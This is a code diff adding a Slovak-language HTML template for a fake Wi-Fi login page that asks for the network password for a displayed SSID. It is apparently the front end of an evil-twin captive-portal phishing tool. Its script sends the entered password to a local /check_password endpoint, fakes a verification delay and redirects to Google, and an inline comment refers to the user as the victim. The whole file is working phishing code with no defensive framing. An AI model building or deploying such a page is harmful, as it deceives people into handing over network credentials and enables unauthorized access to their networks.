@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ ssid }} – Pripojenie k sieti</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="wifi-icon">
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 3C7.02944 3 3 7.02944 3 12C3 14.3878 4.03839 16.5616 5.75 18.1562V21H8.25V18.1562C9.96161 16.5616 11 14.3878 11 12C11 11.4477 11.4477 11 12 11C12.5523 11 13 11.4477 13 12C13 14.3878 14.0384 16.5616 15.75 18.1562V21H18.25V18.1562C19.9616 16.5616 21 14.3878 21 12C21 7.02944 16.9706 3 12 3Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            
+            <h1>Pripojenie k sieti</h1>
+            <p class="ssid-name">{{ ssid }}</p>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="passwordInput">Heslo siete:</label>
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        name="password" 
+                        placeholder="Zadajte heslo" 
+                        required
+                        autocomplete="off"
+                    >
+                </div>
+                
+                <button type="submit" class="btn-connect">
+                    <span class="btn-text">Pripojiť sa</span>
+                    <span class="btn-loader" style="display: none;">
+                        <span></span><span></span><span></span>
+                    </span>
+                </button>
+            </form>
+            
+            <div id="message" class="message"></div>
+            
+            <div class="footer">
+                <p>Pre pripojenie k sieti zadajte heslo</p>
+                <p class="small">Táto stránka je súčasťou sieťového overenia</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            const passwordInput = document.getElementById('passwordInput');
+            const messageDiv = document.getElementById('message');
+            const btnConnect = document.querySelector('.btn-connect');
+            const btnText = document.querySelector('.btn-text');
+            const btnLoader = document.querySelector('.btn-loader');
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const password = passwordInput.value.trim();
+                
+                if (!password) {
+                    showMessage('Zadajte prosím heslo.', 'error');
+                    return;
+                }
+                
+                // Zobraz loading
+                btnText.style.display = 'none';
+                btnLoader.style.display = 'inline-block';
+                btnConnect.disabled = true;
+                
+                // Odoslanie hesla na server
+                fetch('/check_password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ password: password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        showMessage('Overujem pripojenie...', 'info');
+                        
+                        // Simulácia "čakania" – obeť si myslí, že sa overuje
+                        setTimeout(() => {
+                            showMessage('✅ Pripojenie úspešné! Presmerovávam...', 'success');
+                            
+                            // Presmerovanie na "úspešnú" stránku (alebo len reload)
+                            setTimeout(() => {
+                                // Môžete presmerovať na skutočnú stránku (napr. Google)
+                                window.location.href = 'https://www.google.com';
+                            }, 2000);
+                        }, 3000);
+                    } else {
+                        showMessage(data.message, 'error');
+                        resetButton();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showMessage('Nastala chyba. Skúste to znova.', 'error');
+                    resetButton();
+                });
+            });
+            
+            function showMessage(text, type) {
+                messageDiv.textContent = text;
+                messageDiv.className = `message ${type}`;
+                
+                // Automatické skrytie po 5 sekundách (okrem úspechu)
+                if (type !== 'success') {
+                    setTimeout(() => {
+                        messageDiv.textContent = '';
+                        messageDiv.className = 'message';
+                    }, 5000);
+                }
+            }
+            
+            function resetButton() {
+                btnText.style.display = 'inline';
+                btnLoader.style.display = 'none';
+                btnConnect.disabled = false;
+            }
+            
+            // Automatické odoslanie pri stlačení Enter
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    form.requestSubmit();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
